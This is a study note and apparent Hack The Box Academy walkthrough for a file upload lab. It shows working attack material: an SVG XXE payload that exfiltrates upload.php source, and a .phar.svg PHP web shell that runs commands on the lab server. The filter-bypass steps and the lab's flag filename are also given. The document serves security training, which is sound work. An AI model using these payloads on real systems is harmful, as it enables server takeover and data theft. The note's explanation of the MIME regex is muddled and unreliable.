# NOTE — Skills Assessment - File Upload Attacks

## ID
532

## Module
File Upload Attacks

## Kind
lab

## Title
Skills Assessment — File Upload Attacks

## Description
Chains extension fuzzing, Content-Type fuzzing, SVG XXE source code exfiltration, and double-extension PHP web shell upload to achieve RCE on a hardened upload form.

## Tags
file-upload, xxe, svg, phar, burp-intruder, rce, whitebox

## Commands
- `cat << 'EOF' > shell.svg ... EOF` — create SVG with XXE payload
- `mv shell.svg shell.jpeg` — rename to bypass frontend extension check
- `echo '<BASE64>' | base64 -d` — decode exfiltrated PHP source
- `cat << 'EOF' > shell.phar.jpeg ... EOF` — create double-extension web shell
- `cat web-all-content-types.txt | grep 'image/'` — filter image MIME types for Content-Type fuzzing
- `wget https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/web-all-content-types.txt` — download Content-Type wordlist
- `http://<TARGET>:<PORT>/contact/user_feedback_submissions/<YMD>_shell.phar.svg?cmd=<CMD>` — execute commands via uploaded web shell

## What This Section Covers
A full-chain file upload attack against a web app with multiple layered defenses: extension blacklist, extension whitelist, Content-Type validation, and MIME type validation. The attack combines SVG XXE for source code analysis with a double-extension `.phar.svg` web shell to bypass all filters and achieve RCE.

## Methodology
1. Find the upload form on the **Contact Us** page. Upload a normal image to observe behavior — images display as base64, upload directory not disclosed.
2. **Fuzz extensions** with Burp Intruder using PHP extension wordlists. Identify extensions that bypass the blacklist (response says "Only images are allowed" instead of "Extension not allowed"): `.pht`, `.phtm`, `.phar`, `.pgif`.
3. **Fuzz Content-Type** with Burp Intruder using `image/*` content types. Identify accepted types: `image/jpg`, `image/jpeg`, `image/png`, `image/svg+xml`.
4. **SVG XXE to read source code**: upload an SVG with `php://filter/convert.base64-encode/resource=upload.php`. Rename `.svg` → `.jpeg` for frontend bypass, then change back to `.svg` + `Content-Type: image/svg+xml` in Burp.
5. **Decode and analyze upload.php**: identify the upload directory (`./user_feedback_submissions/`), file naming scheme (`date('ymd') . '_' . filename`), blacklist regex, whitelist regex, and MIME type regex.
6. **Craft double-extension web shell**: `shell.phar.svg` — `.phar` bypasses the blacklist and gets processed by PHP, `.svg` satisfies the whitelist regex (`/^.+\.[a-z]{2,3}g$/`). Include `<?php system($_REQUEST['cmd']); ?>` after the SVG payload.
7. Upload the shell (same frontend bypass trick), then navigate to `http://<TARGET>/contact/user_feedback_submissions/<YMD>_shell.phar.svg?cmd=<CMD>`.
8. Run `ls /` to find the flag filename, then `cat /flag_<hash>.txt`.

## Multi-step Workflow
```
# Step 1 — Read upload.php source via SVG XXE
cat << 'EOF' > shell.svg
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg>
EOF
mv shell.svg shell.jpeg
# Upload shell.jpeg → Burp: change filename to shell.svg, Content-Type to image/svg+xml
# Decode the base64 response:
echo '<BASE64>' | base64 -d

# Step 2 — Upload PHP web shell with double extension
cat << 'EOF' > shell.phar.jpeg
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg> <?php system($_REQUEST['cmd']); ?>
EOF
# Upload shell.phar.jpeg → Burp: change filename to shell.phar.svg, Content-Type to image/svg+xml

# Step 3 — Execute commands (YMD = today's date e.g. 260507)
curl "http://<TARGET>:<PORT>/contact/user_feedback_submissions/<YMD>_shell.phar.svg?cmd=ls+/"
curl "http://<TARGET>:<PORT>/contact/user_feedback_submissions/<YMD>_shell.phar.svg?cmd=cat+/<FLAG_FILE>"


```

## Source Code Analysis — upload.php Filters
```
Blacklist:  preg_match('/.+\.ph(p|ps|tml)/', $fileName)
            → Blocks .php, .phps, .phtml
            → DOES NOT block .phar, .pht, .phtm, .pgif

Whitelist:  preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)
            → Extension must end with 'g', be 3-4 chars total (e.g. jpg, png, svg)
            → .phar.svg passes because the LAST extension is .svg

MIME type:  preg_match('/image\/[a-z]{2,3}g/', $type)
            → Must match image/svg+xml? No — image/svg+xml passes because
              it matches 'image/' followed by 'svg' (3 lowercase + 'g' pattern? Actually 'svg+xml')
            → Key: image/svg+xml is accepted

Upload dir: ./user_feedback_submissions/
Naming:     date('ymd') . '_' . basename(filename)
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Read flag at / | (paste flag here) | Double-extension .phar.svg web shell → `cmd=cat /flag_<hash>.txt` |

## Key Takeaways
- When arbitrary upload is blocked, chain multiple techniques: XXE for recon → source code analysis → targeted bypass.
- Always read the source code first (whitebox). Understanding the exact regex patterns tells you exactly which extensions and MIME types slip through.
- Double extensions like `.phar.svg` are powerful: the last extension satisfies whitelist checks, while Apache processes the first PHP-related extension.
- The frontend can enforce different rules than the backend. Always test uploads through Burp to manipulate filename and Content-Type independently.
- File naming schemes with `date('ymd')` are predictable — you can calculate the exact filename of your uploaded shell.
- SVG being in the image whitelist is a common oversight — it's XML-based and enables XXE, and when combined with PHP code injection, enables RCE.

## Gotchas
- The frontend blocks `.svg` extension — you must rename to `.jpeg` locally, then change back to `.svg` in Burp. Same for `.phar.svg`.
- The Content-Type AND the detected MIME type are both validated — you need `image/svg+xml` in the request header, and the file content must look like an SVG for `mime_content_type()` to return `image/svg+xml`.
- The date prefix changes daily. If you respawn the target the next day, recalculate YMD.
- The blacklist regex `/.+\.ph(p|ps|tml)/` uses `.+` not `$` at the end — it checks if the pattern exists anywhere in the filename, but `.phar` doesn't match `ph(p|ps|tml)`.


# HTB Solution

## Question 1

### "Try to exploit the upload form to read the flag found at the root directory "/"."

After spawning the target machine, students need to visit its website's root page and click on "Contact Us", where images can be uploaded:

![File_Upload_Attacks_Walkthrough_Image_35.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_35.png)

When students try to upload an image, it gets uploaded and displayed directly after clicking the green icon, without having to submit the form, thus, students need not click on "SUBMIT":

![File_Upload_Attacks_Walkthrough_Image_36.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_36.png)

Checking the uploaded image's link, students will notice that it is saved as a base64 string, with its full path not being disclosed, thus, the uploads directory can't be determined:

![File_Upload_Attacks_Walkthrough_Image_37.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_37.png)

Subsequently, students need to start `Burp Suite`, set `FoxyProxy` to the preconfigured "BURP" profile, and click on the green icon to intercept the image upload request and send it to `Intruder` (`Ctrl` + `I`):

![File_Upload_Attacks_Walkthrough_Image_38.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_38.png)

After clearing the default payload markers, students need to test for whitelisted extensions by adding a payload marker before the dot, such that it becomes `§.jpg§`:

![File_Upload_Attacks_Walkthrough_Image_39.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_39.png)

Then, students need to uncheck "URL-encode these characters", copy the items of the [PHP extensions.lst](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) list and paste them under `Payload Options`, then click "Start attack":

![File_Upload_Attacks_Walkthrough_Image_40.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_40.png)

![File_Upload_Attacks_Walkthrough_Image_41.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_41.png)

Students will notice that the responses for the requests of extensions `.pht`, `.phtm`, `.phar`, and `.pgif` don't contain "Extension not allowed" but rather "Only images are allowed":

![File_Upload_Attacks_Walkthrough_Image_42.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_42.png)

Thus, students need to choose one of the extensions to attempt bypassing the whitelist test, `.phar` will be used. Because any file with an extension not ending with that of an image can't be uploaded, the best attempt students can take is to name a shell file as `shell.phar.jpg`. However, this file can only be uploaded if the `Content-Type` header of the original image is not modified. Therefore, students need to fuzz the `Content-Type` header value. First, students need to add a payload marker around the value of `Content-Type`, such that it becomes `§image/jpeg§`:

![File_Upload_Attacks_Walkthrough_Image_43.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_43.png)

Then, students need to download [web-all-content-types.txt](https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/web-all-content-types.txt):

        shell
`wget https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/web-all-content-types.txt`

        shell-session
`┌─[eu-academy-1]─[10.10.14.228]─[htb-ac413848@htb-l4rsenhs6c]─[~] └──╼ [★]$ wget https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/web-all-content-types.txt--2022-11-30 05:03:37--  https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/web-all-content-types.txt Resolving github.com (github.com)... 140.82.121.3 Connecting to github.com (github.com)|140.82.121.3|:443... connected. HTTP request sent, awaiting response... 302 Found Location: https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/web-all-content-types.txt [following] --2022-11-30 05:03:37--  https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/web-all-content-types.txt Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.111.133, ... Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected. HTTP request sent, awaiting response... 200 OK Length: 58204 (57K) [text/plain] Saving to: ‘web-all-content-types.txt’ web-all-content-types.txt    100%[==============================================>]  56.84K  --.-KB/s    in 0.001s   2022-11-30 05:03:37 (59.6 MB/s) - ‘web-all-content-types.txt’ saved [58204/58204]`

Subsequently, students need only to have content types that contain `image/`, so they need to use `grep`, copy the matching ones to the clipboard, and then paste them under "Payload Options" in `Burp Suite`:

        shell
`cat web-all-content-types.txt | grep 'image/' | xclip -se c`

        shell-session
`┌─[eu-academy-1]─[10.10.14.228]─[htb-ac413848@htb-l4rsenhs6c]─[~] └──╼ [★]$ cat web-all-content-types.txt | grep 'image/' | xclip -se c`

![File_Upload_Attacks_Walkthrough_Image_44.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_44.png)

After clicking on "Start attack" (and making sure that "URL-encode these characters" is unchecked), students will notice that most responses are 190 bytes in size, containing the message "Only images are allowed", however, the responses for `image/jpg`, `image/jpeg`, `image/png`, and `image/svg+xml` are an exception, as the images got uploaded successfully:

![File_Upload_Attacks_Walkthrough_Image_45.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_45.png)

Since SVG images are allowed, and the uploaded images get reflected to the students, they need to attempt an SVG attack by creating an image called `shell.svg` with the following content to read the source code of the file `upload.php`:

        xml
`<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg>`

Students can use `cat` to save the `XML` code into a file:

        shell
`cat << 'EOF' > shell.svg <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg> EOF`

        shell-session
`┌─[eu-academy-1]─[10.10.14.228]─[htb-ac413848@htb-l4rsenhs6c]─[~] └──╼ [★]$ cat << 'EOF' > shell.svg > <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg> > EOF`

Subsequently, students need to upload `shell.svg`, however, when attempting to, they will receive the message "only images are allowed". To bypass this, students can change the extension from `.svg` to `.jpeg`:

        shell
`mv shell.svg shell.jpeg`

        shell-session
`┌─[eu-academy-1]─[10.10.14.228]─[htb-ac413848@htb-l4rsenhs6c]─[~] └──╼ [★]$ mv shell.svg shell.jpeg`

![File_Upload_Attacks_Walkthrough_Image_46.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_46.png)

However, in the intercepted request, students need to change the filename to have the `.svg` extension and `Content-Type` to be `image/svg+xml`:

![File_Upload_Attacks_Walkthrough_Image_47.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_47.png)

After forwarding the request and checking its response, students will notice that they have the base64-encoded version of `upload.php`, thus, they need to decode it:

![File_Upload_Attacks_Walkthrough_Image_48.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_48.png)

        shell
`echo 'PD9waHAKcmVxdWlyZV9vbmNlKCcuL2NvbW1vbi1mdW5jdGlvbnMucGhwJyk7CgovLyB1cGxvYWRlZCBmaWxlcyBkaXJlY3RvcnkKJHRhcmdldF9kaXIgPSAiLi91c2VyX2ZlZWRiYWNrX3N1Ym1pc3Npb25zLyI7CgovLyByZW5hbWUgYmVmb3JlIHN0b3JpbmcKJGZpbGVOYW1lID0gZGF0ZSgneW1kJykgLiAnXycgLiBiYXNlbmFtZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bIm5hbWUiXSk7CiR0YXJnZXRfZmlsZSA9ICR0YXJnZXRfZGlyIC4gJGZpbGVOYW1lOwoKLy8gZ2V0IGNvbnRlbnQgaGVhZGVycwokY29udGVudFR5cGUgPSAkX0ZJTEVTWyd1cGxvYWRGaWxlJ11bJ3R5cGUnXTsKJE1JTUV0eXBlID0gbWltZV9jb250ZW50X3R5cGUoJF9GSUxFU1sndXBsb2FkRmlsZSddWyd0bXBfbmFtZSddKTsKCi8vIGJsYWNrbGlzdCB0ZXN0CmlmIChwcmVnX21hdGNoKCcvLitcLnBoKHB8cHN8dG1sKS8nLCAkZmlsZU5hbWUpKSB7CiAgICBlY2hvICJFeHRlbnNpb24gbm90IGFsbG93ZWQiOwogICAgZGllKCk7Cn0KCi8vIHdoaXRlbGlzdCB0ZXN0CmlmICghcHJlZ19tYXRjaCgnL14uK1wuW2Etel17MiwzfWckLycsICRmaWxlTmFtZSkpIHsKICAgIGVjaG8gIk9ubHkgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgIGRpZSgpOwp9CgovLyB0eXBlIHRlc3QKZm9yZWFjaCAoYXJyYXkoJGNvbnRlbnRUeXBlLCAkTUlNRXR5cGUpIGFzICR0eXBlKSB7CiAgICBpZiAoIXByZWdfbWF0Y2goJy9pbWFnZVwvW2Etel17MiwzfWcvJywgJHR5cGUpKSB7CiAgICAgICAgZWNobyAiT25seSBpbWFnZXMgYXJlIGFsbG93ZWQiOwogICAgICAgIGRpZSgpOwogICAgfQp9CgovLyBzaXplIHRlc3QKaWYgKCRfRklMRVNbInVwbG9hZEZpbGUiXVsic2l6ZSJdID4gNTAwMDAwKSB7CiAgICBlY2hvICJGaWxlIHRvbyBsYXJnZSI7CiAgICBkaWUoKTsKfQoKaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRfZmlsZSkpIHsKICAgIGRpc3BsYXlIVE1MSW1hZ2UoJHRhcmdldF9maWxlKTsKfSBlbHNlIHsKICAgIGVjaG8gIkZpbGUgZmFpbGVkIHRvIHVwbG9hZCI7Cn0K' | base64 -d`

        shell-session
`┌─[eu-academy-1]─[10.10.14.228]─[htb-ac413848@htb-l4rsenhs6c]─[~] └──╼ [★]$ echo 'PD9waHAKcmVxdWlyZV9vbmNlKCcuL2NvbW1vbi1mdW5jdGlvbnMucGhwJyk7CgovLyB1cGxvYWRlZCBmaWxlcyBkaXJlY3RvcnkKJHRhcmdldF9kaXIgPSAiLi91c2VyX2ZlZWRiYWNrX3N1Ym1pc3Npb25zLyI7CgovLyByZW5hbWUgYmVmb3JlIHN0b3JpbmcKJGZpbGVOYW1lID0gZGF0ZSgneW1kJykgLiAnXycgLiBiYXNlbmFtZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bIm5hbWUiXSk7CiR0YXJnZXRfZmlsZSA9ICR0YXJnZXRfZGlyIC4gJGZpbGVOYW1lOwoKLy8gZ2V0IGNvbnRlbnQgaGVhZGVycwokY29udGVudFR5cGUgPSAkX0ZJTEVTWyd1cGxvYWRGaWxlJ11bJ3R5cGUnXTsKJE1JTUV0eXBlID0gbWltZV9jb250ZW50X3R5cGUoJF9GSUxFU1sndXBsb2FkRmlsZSddWyd0bXBfbmFtZSddKTsKCi8vIGJsYWNrbGlzdCB0ZXN0CmlmIChwcmVnX21hdGNoKCcvLitcLnBoKHB8cHN8dG1sKS8nLCAkZmlsZU5hbWUpKSB7CiAgICBlY2hvICJFeHRlbnNpb24gbm90IGFsbG93ZWQiOwogICAgZGllKCk7Cn0KCi8vIHdoaXRlbGlzdCB0ZXN0CmlmICghcHJlZ19tYXRjaCgnL14uK1wuW2Etel17MiwzfWckLycsICRmaWxlTmFtZSkpIHsKICAgIGVjaG8gIk9ubHkgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgIGRpZSgpOwp9CgovLyB0eXBlIHRlc3QKZm9yZWFjaCAoYXJyYXkoJGNvbnRlbnRUeXBlLCAkTUlNRXR5cGUpIGFzICR0eXBlKSB7CiAgICBpZiAoIXByZWdfbWF0Y2goJy9pbWFnZVwvW2Etel17MiwzfWcvJywgJHR5cGUpKSB7CiAgICAgICAgZWNobyAiT25seSBpbWFnZXMgYXJlIGFsbG93ZWQiOwogICAgICAgIGRpZSgpOwogICAgfQp9CgovLyBzaXplIHRlc3QKaWYgKCRfRklMRVNbInVwbG9hZEZpbGUiXVsic2l6ZSJdID4gNTAwMDAwKSB7CiAgICBlY2hvICJGaWxlIHRvbyBsYXJnZSI7CiAgICBkaWUoKTsKfQoKaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRfZmlsZSkpIHsKICAgIGRpc3BsYXlIVE1MSW1hZ2UoJHRhcmdldF9maWxlKTsKfSBlbHNlIHsKICAgIGVjaG8gIkZpbGUgZmFpbGVkIHRvIHVwbG9hZCI7Cn0K' |base64 -d <?php require_once('./common-functions.php'); // uploaded files directory $target_dir = "./user_feedback_submissions/"; // rename before storing $fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]); $target_file = $target_dir . $fileName; // get content headers $contentType = $_FILES['uploadFile']['type']; $MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']); // blacklist test if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {     echo "Extension not allowed";    die(); } // whitelist test if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {     echo "Only images are allowed";    die(); } // type test foreach (array($contentType, $MIMEtype) as $type) {     if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {        echo "Only images are allowed";        die();    } } // size test if ($_FILES["uploadFile"]["size"] > 500000) {     echo "File too large";    die(); } if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {     displayHTMLImage($target_file); } else {     echo "File failed to upload";`

From the decoded output, students will know that the uploads directory is `./user_feedback_submissions/`, and that the uploaded file names are prepended with the date `ymd`, which adds the current year in short format, the current month, and the current day. With this information, students now need to upload a PHP web shell so that they can execute commands by creating an SVG file that contains it:

        xml
`<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg> <?php system($_REQUEST['cmd']); ?>`

Students can use `cat` to save the exploit into a file:

        shell
`cat << 'EOF' > shell.phar.svg <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg> <?php system($_REQUEST['cmd']); ?> EOF`

        shell-session
`┌─[eu-academy-1]─[10.10.14.228]─[htb-ac413848@htb-l4rsenhs6c]─[~] └──╼ [★]$ cat << 'EOF' > shell.phar.svg > <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg> <?php system($_REQUEST['cmd']); ?> > EOF`

Subsequently, since the frontend does not allow `.svg` extensions, students need to change it to `.jpeg`:

        shell
`mv shell.phar.svg shell.phar.jpeg`

        shell-session
`┌─[eu-academy-1]─[10.10.14.228]─[htb-ac413848@htb-l4rsenhs6c]─[~] └──╼ [★]$ mv shell.phar.svg shell.phar.jpeg`

![File_Upload_Attacks_Walkthrough_Image_49.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_49.png)

Within the intercepted request, students need to change back the extension to `.svg` for filename and make `Content-Type` to be `image/svg+xml`:

![File_Upload_Attacks_Walkthrough_Image_50.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_50.png)

After forwarding the request, students need to navigate to `http://STMIP:STMPO/contact/user_feedback_submissions/YMD_shell.phar.svg` and use the `cmd` URL parameter to execute commands, as in `http://STMIP:STMPO/contact/user_feedback_submissions/YMD_shell.phar.svg?cmd=ls+/`:

![File_Upload_Attacks_Walkthrough_Image_51.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_51.png)

Students will notice that the flag file exists in the root directory with the name `flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt`, thus they need to fetch its contents, as in `http://STMIP:STMPO/contact/user_feedback_submissions/YMD_shell.phar.svg?cmd=cat+/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt`:

![File_Upload_Attacks_Walkthrough_Image_52.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_52.png)

Answer: {hidden}

Close
